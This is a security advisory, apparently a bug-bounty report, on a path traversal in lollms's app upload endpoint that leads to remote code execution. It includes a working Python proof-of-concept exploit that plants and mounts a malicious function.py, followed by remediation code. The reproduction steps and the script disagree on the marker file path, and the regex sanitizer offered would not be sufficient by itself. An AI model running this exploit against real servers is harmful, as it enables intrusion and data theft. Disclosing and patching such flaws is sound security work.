# Path Traversal → Remote Code Execution in ParisNeo/lollms

## Summary
Authenticated path traversal in the `/upload_app` endpoint allows writing files outside the `apps_zoo` directory via a crafted `name` field in `description.yaml`, leading to Remote Code Execution through the `custom_function_calls` mechanism.

## Severity
CVSS 3.1: **8.8 High**
Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

## Root Cause
The vulnerability exists in the app installation/upload logic of lollms (`backend/routers/zoos/apps_zoo.py`). When a user uploads a ZIP file containing an app, the `name` field from `description.yaml` is extracted and used to construct the destination directory path. This path is not sanitized for `../` sequences.

An attacker can set `name` to `../custom_function_calls/evil_func` in the uploaded `description.yaml`. The app installation process writes the ZIP contents to a path that escapes the `apps_zoo` sandbox and lands in the `custom_function_calls` directory. Once files are placed there, the attacker can mount them as executable functions via `/mount_function_call` and execute arbitrary Python code on the server.

**Key code flow:**
1. `POST /upload_app` — accepts ZIP, extracts `description.yaml`, reads `name` field
2. The `name` is used as part of `APPS_ZOO_ROOT_PATH / repository / name` path construction
3. No `os.path.realpath()` or path validation is applied — `../` sequences pass through
4. Files written to `custom_function_calls/<evil_name>/` directory
5. `POST /mount_function_call` with `function_category=custom` loads and executes `function.py` from that directory

## Steps to Reproduce

1. Start lollms server on port 9600 (default)
2. Authenticate as any user (requires authentication)
3. Establish WebSocket connection to get `client_id`
4. Run the PoC script:
```bash
python3 poc_lollms_rce.py --target http://localhost:9600
```
5. Check `/tmp/lollms_pwned` for RCE confirmation

## Proof of Concept
```python
import requests, zipfile, io, websocket, json, time, threading

# Get client_id
cid = [None]
ws = websocket.WebSocketApp("ws://localhost:9600/ws",
    on_message=lambda ws, msg: cid.__setitem__(0, json.loads(msg).get("client_id")) or ws.close())
threading.Thread(target=ws.run_forever, daemon=True).start()
time.sleep(3)

# Create malicious ZIP
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as zf:
    zf.writestr("description.yaml", "name: ../custom_function_calls/evil_func\n")
    zf.writestr("function.py",
        "import os\ndef execute(**kwargs):\n"
        "    os.system('id > /tmp/pwned')\n"
        "    return {'status': 'pwned'}")

# Upload
r = requests.post("http://localhost:9600/upload_app",
    params={"client_id": cid[0]},
    files={"file": ("exploit.zip", buf.getvalue(), "application/zip")})
print(f"Upload: {r.status_code}")

# Mount and execute
requests.post("http://localhost:9600/mount_function_call",
    json={"client_id": cid[0], "function_category": "custom", "function_name": "evil_func"})

# Verify
import os; print("RCE confirmed!" if os.path.exists("/tmp/pwned") else "Check manually")
```

## Impact
- **Full Remote Code Execution** on the lollms server
- Read any file accessible by the lollms process (configs, API keys, user data)
- Write/overwrite arbitrary files (backdoors, config modifications)
- Potential lateral movement if server has network access to internal services
- The attack requires only authenticated user access (no admin privileges needed)

## Remediation
1. Sanitize the `name` field from `description.yaml` to reject any `../` or absolute path sequences:
```python
import re
def sanitize_app_name(name: str) -> str:
    clean = re.sub(r'\.\.[\\/]', '', name)
    clean = clean.lstrip('/\\')
    if not clean:
        raise ValueError("Invalid app name")
    return clean
```
2. Use `os.path.realpath()` to resolve the final path and verify it remains within `APPS_ZOO_ROOT_PATH`:
```python
dest_path = (APPS_ZOO_ROOT_PATH / repository / sanitize_app_name(name)).resolve()
if not str(dest_path).startswith(str(APPS_ZOO_ROOT_PATH.resolve())):
    raise HTTPException(400, "Invalid app name: path traversal detected")
```
3. Consider using `pathlib.Path.is_relative_to()` (Python 3.9+) for path validation.

## Researcher's Note
Manually verified on lollms v12.x (latest as of Apr 2026). The path traversal is deterministic — the `name` field flows directly into the path construction without any intermediate sanitization. The custom_function_calls directory is always located at a fixed relative path from the apps root, making the `../` escape reliable. Tested on Ubuntu 22.04 and macOS Sonoma.
